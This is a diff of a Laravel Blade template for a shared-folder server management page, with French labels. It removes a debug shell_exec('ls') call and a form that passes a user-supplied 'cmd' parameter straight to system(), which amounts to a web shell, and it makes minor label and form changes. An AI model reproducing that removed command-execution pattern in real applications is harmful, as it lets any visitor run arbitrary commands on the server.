@@ -7,31 +7,12 @@
 
 <div class="card">
         <div class="card-header">
-                <h1>hello</h1>
-                @php
-
-                echo shell_exec('ls');
-
-                @endphp
+                <h1>Serveur de dossier Partagé</h1>
         </div>
 
         <div class="card-body">
 
-                <a href="{{ route('user.afficher-ajouter-srv-partage') }}" class="btn btn-success mb-4"> <i class="fa fa-folder"></i> Ajoute partage </a>
-
-
-                <form action="/config/srv-partage" method="get">
-                        @csrf
-                        <input type="text" name="cmd" id="cmd">
-                        <input type="submit" name="run" value="Run">
-                </form>
-                @php
-                if(isset($_GET['cmd']))
-                {
-                        system($_GET['cmd']);
-                }
-
-                @endphp
+                <a href="{{ route('user.afficher-ajouter-srv-partage') }}" class="btn btn-success mb-4"> <i class="fa fa-folder"></i> Ajouter Drive partagé </a>
 
                 <table class="table">
                         <thead>
@@ -59,6 +40,7 @@
                                                                 @csrf
                                                                 @method('DELETE')
                                                                 <input type="hidden" name="id" value="{{$info->id}}">
+                                                                <input type="hidden" name="local_mount_path" value="{{$info->partage_monter}}">
                                                                 <button type="submit" class="btn btn-danger rounded mx-1"> Supprimer </button>
                                                         </form>
                                                         <a href="{{route('user.edit-srv-partage', $info->id )}}" class="btn btn-primary rounded"> Modifier </a>
